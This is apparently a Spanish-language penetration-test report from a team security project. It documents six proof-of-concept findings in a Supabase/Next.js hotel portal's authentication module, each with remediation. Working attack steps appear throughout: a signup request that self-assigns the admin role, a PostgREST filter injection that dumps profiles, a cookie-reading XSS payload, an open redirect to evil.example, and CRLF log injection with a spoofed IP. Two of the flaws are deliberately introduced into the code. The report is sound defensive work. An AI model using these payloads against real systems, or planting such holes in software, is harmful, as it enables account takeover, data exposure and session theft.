# Fase 2 — PoCs · Módulo de Autenticación (`auth`)

| Campo | Valor |
|---|---|
| Módulo | Autenticación (`auth`) |
| Responsable | Paula |
| Rama | `security/auth/fase2-pocs` |
| Insumo | `docs/proyecto-seguridad/auth/fase-1-diagnostico.md` (§2 observaciones, §4.5 riesgos) |
| Estado | **P2.1 (V1) + P2.2 (V2) + P2.3 (V3) completos** — AUTH-POC-1 … AUTH-POC-6. |

> **Vector 1 del enunciado = servidor:** A03 (inyección) **y** A01 (control de acceso / confianza en el JWT).
> El módulo de autenticación tiene hallazgos **reales y fuertes** en A01 (AUTH-POC-1 y AUTH-POC-2) pero
> **ningún sink de inyección real** en A03: todo el acceso a datos de los flujos de auth pasa por el query
> builder parametrizado de Supabase (`.eq()`, `signInWithPassword`). Por eso, siguiendo la decisión de
> equipo del plan §4.1, la parte A03 se cubre con una **vulnerabilidad introducida** (AUTH-POC-3), marcada
> como tal, que la Fase 3 debe eliminar de raíz.

---

## AUTH-POC-1 — Escalamiento de privilegios en el registro (rol controlado por el cliente)

| Campo | Valor |
|---|---|
| ID | AUTH-POC-1 |
| Vector | 1 — servidor |
| OWASP | A01:2021 Broken Access Control (escalamiento vertical de privilegios) |
| NIST CSF 2.0 | PR.AA-05 (menor privilegio), PR.AA-01 (identidades gestionadas), GV.RM |
| Origen del hallazgo | **Real** (confirma O-02 de la Fase 1) |
| Riesgo asociado | AUTH-R01 (Crítico, provisional, unido a US-R01) |
| Componente / archivo:línea | `packages/db/supabase/migrations/20260512000002_users-table-policies.sql:57-65` (trigger `handle_new_user`); cadena de confianza en `packages/core/src/permissions/index.ts:31-35` y `packages/core/src/auth` (`verifyAdminRole`) |

### Descripción

El trigger `on_auth_user_created` ejecuta `handle_new_user()` después de cada alta en `auth.users`
(registro público, OAuth, invitación). Esa función inserta el rol del usuario en `public.user_roles`
tomándolo del **metadata del propio usuario**:

```sql
-- handle_new_user() — 20260512000002_users-table-policies.sql:57
insert into public.user_roles (user_id, role)
values (
  new.id,
  CAST(coalesce(
    new.raw_app_meta_data ->> 'role',   -- NO controlable por el cliente (invitaciones admin)
    new.raw_user_meta_data ->> 'role',   -- ⚠️ SÍ controlable: viene del `data` del signup
    'client'
  ) as public.user_role)
);
```

`raw_user_meta_data` se rellena con el objeto `data` que el cliente envía a `/auth/v1/signup`. La app
usa la **anon key pública** (K02 de la Fase 1), que permite registrarse sin autenticación. Un atacante
puede registrarse pasando `data: { role: "admin" }` y el trigger lo inserta como `admin` en `user_roles`.

Como `verifyAdminRole` y las comprobaciones de permisos (`getUserRole`, drawers de permisos, etc.) leen
el rol **desde `user_roles`** —no desde una fuente de confianza del servidor—, el atacante queda con rol
`admin` de negocio sin ninguna invitación ni aprobación.

### Precondiciones

- Ninguna. El registro es público y usa la anon key (expuesta en el cliente).
- El atacante solo necesita poder llamar al endpoint de signup de Supabase (lo hace el propio formulario,
  o `curl` directo con la anon key).

### Pasos reproducibles

```bash
# Signup directo contra GoTrue con rol inyectado en user_metadata (data).
curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
  -H "apikey: $SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
        "email": "attacker@example.com",
        "password": "Sup3rSecret!",
        "data": { "full_name": "Mallory", "role": "admin" }
      }'
```

Verificación en la base de datos (SQL / Supabase Studio):

```sql
select ur.role
from public.user_roles ur
join auth.users u on u.id = ur.user_id
where u.email = 'attacker@example.com';
-- → admin   (esperado: client)
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Rol asignado al registro público | `client` (siempre) | `admin` (elegido por el atacante) |
| Requisito para ser admin | Invitación vía `raw_app_meta_data` | Ninguno |

### Impacto

Escalamiento vertical total: el atacante accede al panel y a toda operación protegida por rol/permiso de
admin. Es la causa raíz del riesgo AUTH-R01/US-R01 (Crítico). Se cruza con el módulo de Gestión de
Usuarios (Joseph), que consume el mismo `user_roles`.

### Evidencia

- `evidencias/AUTH-POC-1-signup-role-admin.txt` — request/response del signup (anon key redactada).
- `evidencias/AUTH-POC-1-user_roles-admin.png` — fila `role = admin` en `user_roles`.

### Remediación (Fase 3 → P3.1)

- El trigger debe **ignorar** `raw_user_meta_data ->> 'role'`; el rol de registro público se fija a
  `client` en el servidor. La promoción a `admin` solo por `raw_app_meta_data` (invitación) o por una
  acción server-side con permiso.

---

## AUTH-POC-2 — Confianza en claims del JWT y sesión no verificada

| Campo | Valor |
|---|---|
| ID | AUTH-POC-2 |
| Vector | 1 — servidor |
| OWASP | A01:2021 Broken Access Control + A07:2021 Identification & Authentication Failures |
| NIST CSF 2.0 | PR.AA-05, PR.AA-02 (identidades verificadas), DE.CM-01 |
| Origen del hallazgo | **Real** (confirma O-05 y O-11 de la Fase 1) |
| Riesgo asociado | AUTH-R02 / AUTH-R03 |
| Componente / archivo:línea | `packages/db/supabase/migrations/20260609000001_rooms_rls_policies.sql:14-15`; `packages/core/src/auth/server/getServerAuthContext.ts:71` (y `refreshSession.ts`, `getAuthContextAction.ts`) |

### Descripción

**(a) Claim de rol mal ubicado en RLS.** La política de administración de `rooms` confía en un claim del
JWT que no existe como rol de negocio:

```sql
-- 20260609000001_rooms_rls_policies.sql:14
CREATE POLICY "Rooms are manageable by admins only" ON public.rooms
    USING (auth.jwt() ->> 'role' = 'admin');
```

En Supabase, el claim **top-level** `role` del JWT es el rol de Postgres (`authenticated` para cualquier
usuario logueado), **no** el rol de negocio. El rol de negocio que `sync_role_to_jwt` escribe queda bajo
`user_metadata`, no en el top level. Resultado: la condición `auth.jwt() ->> 'role' = 'admin'` **nunca**
se cumple para un usuario normal → confianza mal ubicada en un claim equivocado (control roto). El mismo
patrón `auth.jwt() ->> 'role' = 'admin'` aparece en varias políticas (ver O-05).

**(b) Sesión hidratada sin verificar el JWT.** La hidratación SSR usa `getSession()`, que **no** revalida
la firma del token contra el servidor de Auth:

```ts
// getServerAuthContext.ts:71
const { data, error } = await supabase.auth.getSession();
```

Supabase documenta que en el servidor debe usarse `getUser()` (verifica el JWT contra GoTrue). Confiar en
`getSession()` para decisiones de autorización (hidratar `isAdmin`, etc.) abre la puerta a confiar en un
token no verificado.

### Precondiciones

- (a) Capacidad de inspeccionar el JWT emitido (cualquier usuario logueado puede decodificar su propio
  `access_token`).
- (b) Una cuenta de usuario válida.

### Pasos reproducibles

```sql
-- (a) Comprobar que el claim en el que confía la RLS no es el rol de negocio:
select auth.jwt() ->> 'role' as top_level_role,              -- 'authenticated'
       auth.jwt() -> 'user_metadata' ->> 'role' as biz_role; -- 'client' / 'admin'
-- La política compara contra `top_level_role`, que jamás vale 'admin'.
```

```ts
// (b) Decodificar el access_token de la sesión y mostrar que getSession() no lo
//     verifica contra el servidor (solo lo lee de la cookie):
//     payload.role === "authenticated" para todos; el rol de negocio no viaja donde la RLS lo busca.
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Fuente de autorización | Rol de negocio verificado server-side | Claim `role` del JWT = rol de Postgres (siempre `authenticated`) |
| Verificación del token en SSR | `getUser()` (valida firma) | `getSession()` (no valida) |

### Impacto

La autorización por RLS basada en `auth.jwt() ->> 'role'` es inconsistente y frágil: mezcla el rol de
Postgres con el de negocio. Combinado con AUTH-POC-1 (el atacante ya es `admin` en `user_roles`), el
modelo de confianza del JWT no es una barrera adicional. `getSession()` en SSR no aporta verificación.

### Evidencia

- `evidencias/AUTH-POC-2-jwt-claims.png` — decodificación del JWT mostrando `role: authenticated` y
  `user_metadata.role`.
- `evidencias/AUTH-POC-2-rls-policy.txt` — política de `rooms` y consulta de claims.

### Remediación (Fase 3 → P3.1)

- Reemplazar `auth.jwt() ->> 'role' = 'admin'` por una verificación contra `user_roles`
  (`exists (select 1 from public.user_roles where user_id = auth.uid() and role = 'admin')`) o un claim
  de negocio firmado y ubicado correctamente.
- Usar `getUser()` en lugar de `getSession()` en el servidor para cualquier decisión de autorización.

---

## AUTH-POC-3 — Inyección en filtro PostgREST en "¿ya tengo cuenta?" (introducida)

| Campo | Valor |
|---|---|
| ID | AUTH-POC-3 |
| Vector | 1 — servidor |
| OWASP | A03:2021 Injection (clase PostgREST/Supabase query-builder) + A01:2021 (divulgación de datos) |
| NIST CSF 2.0 | PR.DS-10 (integridad de datos en uso), PR.AA-05, ID.RA-01 |
| Origen del hallazgo | **Introducida** (decisión de equipo §4.1). El módulo de auth no tenía ningún sink de inyección real alcanzable: todo el acceso a datos usa el query builder parametrizado de Supabase (`.eq()`, `signInWithPassword`). Se introdujo una superficie pública realista para el dominio ("¿ya tengo cuenta?" / recuperación) para poder demostrar la parte A03 del Vector 1. |
| Commit de introducción | `chore(security): introduce controlled vuln for AUTH-POC-3` en `security/auth/fase2-pocs` |
| Componente / archivo:línea | `apps/portal-reservas/src/features/auth/services/lookupAccount.server.ts:63-70` (construcción del filtro). Test de regresión: `lookupAccount.server.test.ts`. |

### Descripción

Es el **mismo patrón** que los PoC hermanos del equipo: OP-POC-1 (`lookupReservation.server.ts`,
introducida, Operaciones) y el bug **real** `getAuditLogs.ts:57` (Auditoría). La función arma el filtro
concatenando crudo la entrada del usuario dentro de un string pasado a `.or()` de PostgREST, en vez de
usar `.eq()` / `.ilike()` parametrizados:

```ts
// VULNERABLE — lookupAccount.server.ts:65
const filter = `${c.full_name}.ilike.%${input.name}%,${c.id}.eq.${input.accountId}`;

const { data, error } = await supabase
  .from(DB_TABLES.PROFILES)
  .select(`${c.id}, ${c.full_name}, ${c.is_active}`)
  .or(filter)   // <- input.name / input.accountId inyectados sin escapar
  .limit(50);
```

`.or()` interpreta la coma como separador de condiciones **OR**. Como el valor del usuario se concatena
crudo, el atacante controla la **sintaxis** del filtro, no solo el *valor*: puede inyectar condiciones
siempre-verdaderas y volcar toda la tabla `profiles`. `profiles` tiene RLS, así que esta función pública
pre-login corre bajo el cliente **service-role** (mismo patrón que `lookupReservation.server.ts`), por lo
que el filtro forjado se evalúa contra **todas** las filas.

### Precondiciones

- Ninguna de autenticación: es una ayuda pública de recuperación de cuenta, sin sesión.
- Requiere al menos una fila en `profiles` (se crean al registrarse, AUTH-POC-1).

### Pasos reproducibles

**Prueba de regresión (sin Supabase, demuestra la inyectabilidad del filtro):**

```bash
corepack pnpm --filter @hotel/portal-reservas exec \
  vitest run src/features/auth/services/lookupAccount.server.test.ts
```

El test afirma el string exacto que se envía a `.or()`:

```
# Caso legítimo
full_name.ilike.%Ada Lovelace%,id.eq.00000000-0000-0000-0000-000000000000

# Ataque: name = "a,is_active.eq.true"
full_name.ilike.%a,is_active.eq.true%,id.eq.none
```

que PostgREST parte en tres condiciones OR: `full_name.ilike.%a` (falsa para casi todos),
`is_active.eq.true` (**verdadera para toda cuenta activa**) e `id.eq.none`. Al ser OR, basta la segunda
para devolver **todos los perfiles activos** con su `full_name` e `id`.

**Reproducción en vivo (con Supabase local):** llamar a la server action / endpoint con
`{ "name": "a,is_active.eq.true", "accountId": "none" }` devuelve el listado completo de perfiles.

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| "¿Ya tengo cuenta?" con nombre inexistente | Lista vacía / un match propio | Todos los perfiles activos (PII: nombre, estado, id) |
| Control sobre la consulta | Solo el *valor* buscado | La *sintaxis* del filtro (inyección) |

### Impacto

Divulgación masiva de datos de perfil (nombre completo, estado activo, id) de todos los usuarios, incluida
la identificación de cuentas para encadenar con AUTH-POC-1 (elegir a quién suplantar/escalar). A03 +
A01.

### Evidencia

- Salida de `vitest` del test de regresión (AUTH-POC-3) — `evidencias/AUTH-POC-3-vitest.txt`.
- `evidencias/AUTH-POC-3-dump-profiles.png` — respuesta con todos los perfiles (reproducción en vivo).

### Remediación (Fase 3 → P3.1)

- Reemplazar el `.or()` por filtros parametrizados: `.ilike(c.full_name, \`%${input.name}%\`).eq(c.id, input.accountId)`.
- La prueba de regresión `lookupAccount.server.test.ts` **debe empezar a fallar** cuando se aplique el fix
  (señal de que la concatenación ya no existe).

---

## AUTH-POC-4 — XSS reflejado en `/auth/error` vía `error_description` (introducida)

| Campo | Valor |
|---|---|
| ID | AUTH-POC-4 |
| Vector | 2 — cliente |
| OWASP | A03:2021 Injection (Cross-Site Scripting reflejado) |
| NIST CSF 2.0 | PR.PS-06 (desarrollo seguro), PR.DS-01, DE.CM-01 |
| Origen del hallazgo | **Introducida** (decisión de equipo §4.1). El módulo de auth no tenía ningún sink de XSS real: el portal renderiza todos los valores de auth con JSX (`{errorCode}`, `{descripción}`), que React escapa por defecto. El hallazgo real O-04 (`/auth/error` refleja `error` / `error_description`) es solo **inyección de texto / phishing**, no ejecución de script. Se introdujo un sink realista ("mensaje de error enriquecido") sobre esa misma superficie para demostrar el Vector 2. |
| Commit de introducción | `chore(security): introduce controlled vuln for AUTH-POC-4` en `security/auth/fase2-pocs` |
| Componente / archivo:línea | **Sink:** `apps/portal-reservas/src/app/auth/error/authErrorHtml.ts` (`buildErrorDescriptionHtml` → `{ __html }`) renderizado en `AuthErrorContent.tsx` (`dangerouslySetInnerHTML`). **Fuente:** query param `error_description` (reflejado). Test de regresión: `authErrorHtml.test.ts`. |

### Descripción

Mismo patrón que los sinks hermanos del repo: OP-POC-3 (`ReservationGuestCard.tsx`, introducida, Operaciones)
y el real `AuditLogDetailDrawer.tsx` (Auditoría). La página de error toma el parámetro `error_description`
de la URL y lo renderiza **como HTML** en vez de como texto:

```ts
// VULNERABLE — authErrorHtml.ts
return { __html: raw };   // `raw` = error_description, sin escapar
```
```tsx
// AuthErrorContent.tsx
<p dangerouslySetInnerHTML={errorDetailHtml} />
```

Como React solo escapa el texto interpolado con `{...}`, pasar el valor por `dangerouslySetInnerHTML`
anula esa protección: el atacante controla el **marcado**, no solo el texto. La app no define **CSP** y las
cookies de sesión son legibles desde JS (hallazgo O-10), así que esto es una primitiva de robo de sesión,
no solo un `alert`.

### Precondiciones

- Ninguna de autenticación: `/auth/error` es público. El ataque es un **enlace** que la víctima abre
  (reflejado), p. ej. enviado por correo/chat haciéndose pasar por un aviso del hotel.

### Pasos reproducibles

**Prueba de regresión (sin navegador, demuestra que el sink no sanea):**

```bash
corepack pnpm --filter @hotel/portal-reservas exec \
  vitest run src/app/auth/error/authErrorHtml.test.ts
```

**Reproducción en vivo (solo portal, sin Supabase):**

```bash
pnpm --filter @hotel/portal-reservas dev   # :3001
# Abrir en el navegador de la víctima:
http://localhost:3001/auth/error?error_description=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
```

El payload decodificado es `<img src=x onerror=alert(document.cookie)>`: la imagen falla al cargar y
dispara `onerror`, ejecutando JS en el contexto de la app (aquí, mostrando `document.cookie`).

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| `error_description` en la página | Texto escapado (React) | Marcado HTML ejecutado |
| Control del atacante | El *texto* del mensaje | El *HTML/JS* de la página |

### Impacto

XSS reflejado en una ruta pública de auth. Sin CSP y con cookies legibles desde JS (O-10), permite robo de
sesión / acciones en nombre de la víctima. Es la versión "con dientes" de O-04.

### Evidencia

- `evidencias/AUTH-POC-4-vitest.txt` — salida del test de regresión (3/3).
- `evidencias/AUTH-POC-4-xss-reflected.jpg` — **captura en vivo**: el `<img onerror>` inyectado vía
  `error_description` se ejecuta sobre la página real `/auth/error` (banner rojo "XSS EJECUTADO" + lectura
  de `document.cookie`). El ícono de imagen rota en la tarjeta es el `<img src=x>` que dispara el `onerror`.

### Remediación (Fase 3 → P3.2)

- Renderizar `error_description` como texto (`<p>{raw}</p>`, que React escapa) y eliminar
  `dangerouslySetInnerHTML` / `buildErrorDescriptionHtml`.
- Añadir **CSP** global (archivo compartido `next.config`/`middleware`, avisar al equipo — §4.4) y marcar
  las cookies de sesión `HttpOnly`.
- La prueba `authErrorHtml.test.ts` **debe empezar a fallar** cuando se aplique el fix.

---

## AUTH-POC-5 — Open redirect vía `callbackUrl` (manipulación de parámetros)

| Campo | Valor |
|---|---|
| ID | AUTH-POC-5 |
| Vector | 3 — manipulación de entrada |
| OWASP | A01:2021 Broken Access Control (Unvalidated Redirect) + A08:2021 (manipulación de parámetros) |
| NIST CSF 2.0 | PR.PS-06, PR.DS-02, ID.RA-01 |
| Origen del hallazgo | **Real** (confirma O-03 de la Fase 1) |
| Componente / archivo:línea | `apps/portal-reservas/src/app/auth/callback/route.ts:34-35` (`new URL(callbackUrl, origin)`); `apps/portal-reservas/src/features/auth/services/loginAction.ts:64` (`redirect(callbackUrl || ROUTES.HOME)`) |

### Descripción

Dos flujos de auth redirigen al valor del parámetro `callbackUrl` **sin validar** que sea una ruta interna:

```ts
// callback/route.ts:34
const callbackUrl = searchParams.get(CALLBACK_SEARCH_PARAMS.CALLBACK_URL) || ROUTES.HOME;
return NextResponse.redirect(new URL(callbackUrl, origin));   // origin ignorado si callbackUrl es absoluto
```
```ts
// loginAction.ts:64
redirect(callbackUrl || ROUTES.HOME);   // redirect() de Next acepta URLs externas
```

`new URL(base-relativo, origin)` **ignora** el `origin` cuando el primer argumento es una URL absoluta o
protocol-relative. Verificado con Node:

```
"/dashboard"              -> http://localhost:3001/dashboard   (interno, OK)
"https://evil.example"    -> https://evil.example/             (externo)
"//evil.example"          -> http://evil.example/              (externo, protocol-relative)
```

### Precondiciones

- Ninguna. El atacante solo arma un enlace con `callbackUrl` apuntando a su dominio.

### Pasos reproducibles

```bash
# Callback OAuth/magic-link: tras intercambiar el code, redirige a un dominio externo.
curl -si "http://localhost:3001/auth/callback?code=<code-valido>&callbackUrl=https://evil.example/phish" \
  | grep -i '^location:'
# → location: https://evil.example/phish

# Login: el formulario envía callbackUrl; al autenticar, redirect() sale del sitio.
# Enlace de phishing típico: /auth/login?callbackUrl=https://evil.example/phish
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Destino permitido | Solo rutas internas (`/...`) | Cualquier dominio externo |

### Impacto

Phishing con la confianza del dominio del hotel: el usuario inicia sesión en el sitio real y es enviado a
un clon del atacante. También facilita el robo de `code`/tokens si se encadena con el flujo OAuth.

### Evidencia

- `evidencias/AUTH-POC-5-open-redirect.txt` — `curl -i` mostrando el `Location:` externo (pendiente de entorno).

### Remediación (Fase 3 → P3.3)

- Validar `callbackUrl` contra una **allow-list de rutas internas** (debe empezar por `/` y no ser
  protocol-relative `//`), o resolverlo siempre como ruta relativa descartando esquema y host. Añadir un
  helper `resolveSafeCallbackUrl` con test de regresión.

---

## AUTH-POC-6 — Log injection / audit poisoning en eventos de login (real)

| Campo | Valor |
|---|---|
| ID | AUTH-POC-6 |
| Vector | 3 — manipulación de entrada |
| OWASP | A09:2021 Security Logging & Monitoring Failures + A03 (log injection) |
| NIST CSF 2.0 | DE.CM-01, DE.AE-02/03, PR.PS-04 |
| Origen del hallazgo | **Real** (confirma O-08 de la Fase 1; se solapa con AU-R04 de Fabian) |
| Componente / archivo:línea | `packages/core/src/auth/server/loginAction.ts:93-99` y `apps/panel-admin/src/features/auth/services/loginAction.ts:25-31,48-67` (fuente); sink en `logAuditEvent` + IP en `getAuditRequestContext.ts:35-37` |

### Descripción

Un atacante **sin sesión** puede escribir contenido arbitrario en el rastro de auditoría: los `loginAction`
registran el `email` tecleado y el mensaje de error del proveedor **sin normalizar**, y la IP se toma de
`x-forwarded-for`, cabecera controlable por el cliente:

```ts
// panel-admin/.../loginAction.ts:25
await logAuditEvent({
  actorEmail: email,                                   // ← entrada cruda del atacante
  action: AUDIT_ACTIONS.AUTH_LOGIN_FAILED,
  metadata: { email, reason: error?.message ?? "…" },  // ← email + error sin sanear
  ipAddress,                                            // ← x-forwarded-for (spoofable)
  userAgent,
});
```

El `insert` a `audit_logs` es parametrizado (no hay SQLi), pero `actor_email` es texto libre: un `email`
con saltos de línea / caracteres de control o contenido engañoso contamina el visor y los exports del log
(audit poisoning), y la IP registrada es falsificable. No requiere autenticación: basta enviar intentos de
login.

### Precondiciones

- Ninguna. El endpoint de login es público y registra cada intento fallido.

### Pasos reproducibles

```bash
# Email con CRLF + línea forjada e IP spoofeada; se registra como actor_email/metadata e ip_address.
curl -s -X POST http://localhost:3002/auth/login \
  -H "X-Forwarded-For: 10.0.0.1" \
  --data-urlencode $'email=victima@hotel.com\n[SYSTEM] LOGIN_SUCCESS actor=owner@hotel.com' \
  --data-urlencode 'password=x'
# Luego, en el visor de auditoría / export, la entrada aparece con la línea forjada y la IP falsa.
```

### Resultado esperado vs. obtenido

| | Esperado (diseño) | Obtenido |
|---|---|---|
| Contenido del log | Campos normalizados, IP confiable | Texto arbitrario del atacante + IP spoofeada |

### Impacto

Contaminación del rastro de auditoría (encubrir o incriminar), ruptura de la trazabilidad (DE.AE) y base
para el XSS stored que Fabian demuestra en su visor (AU-R01). Degrada la capacidad de detección del sistema.

### Evidencia

- `evidencias/AUTH-POC-6-log-injection.txt` — request + fila resultante en `audit_logs` (pendiente de entorno).

### Remediación (Fase 3 → P3.3 + P3.4, coordinado con Fabian)

- **Lado auth (P3.3/P3.4):** validar/normalizar el `email` (Zod + strip de caracteres de control) antes de
  pasarlo a `logAuditEvent`; no registrar el `error.message` crudo del proveedor.
- **Lado auditoría (Fabian, F3.3):** normalizar en el sink y derivar la IP de una fuente confiable, no de
  `x-forwarded-for` directo. Coordinar porque `logAuditEvent`/`getAuditRequestContext` son API compartida (§4.4).

---

## Coordinación

- **AUTH-POC-1** comparte causa raíz con el módulo de Gestión de Usuarios (Joseph): `user_roles` y el
  trigger `handle_new_user`. Coordinar el parche P3.1 / J3.1 para no duplicar ni chocar en migraciones.
- **AUTH-POC-2 (a)** toca políticas RLS que también usan otros módulos (`rooms` es de Operaciones). El
  reemplazo del claim `auth.jwt() ->> 'role'` se coordina con Aarón antes de tocar sus políticas.
- **AUTH-POC-3** calca el patrón de OP-POC-1 (Aarón) y del bug real `getAuditLogs.ts:57` (Fabian). El fix
  P3.1 es hermano de A3.1 (Operaciones) y F3.1 (Auditoría).
- **AUTH-POC-4** calca OP-POC-3 (Aarón) y el real `AuditLogDetailDrawer.tsx` (Fabian). El fix P3.2 incluye
  **CSP global** (archivo compartido, §4.4) — avisar al equipo antes de tocar `next.config`/`middleware`.
- **AUTH-POC-6** se solapa con AU-R04 de Fabian; el fix se reparte (normalizar en origen P3.3/P3.4 y en el
  sink F3.3). `logAuditEvent` / `getAuditRequestContext` son API compartida (§4.4).
- **CSRF:** evaluado y **sin hallazgo** — los Server Actions de Next (login, registro, activación) validan
  el `Origin` contra el `Host` por defecto, y el callback es GET y exige un `code` válido. Se documenta como
  control presente, no como vulnerabilidad.
- Las tres pruebas de concepto de los vectores están completas (P2.1–P2.3). Falta **P2.4**: capturas en vivo
  (AUTH-POC-1…6, requieren Supabase/navegador) y el PR de la rama a `develop`.
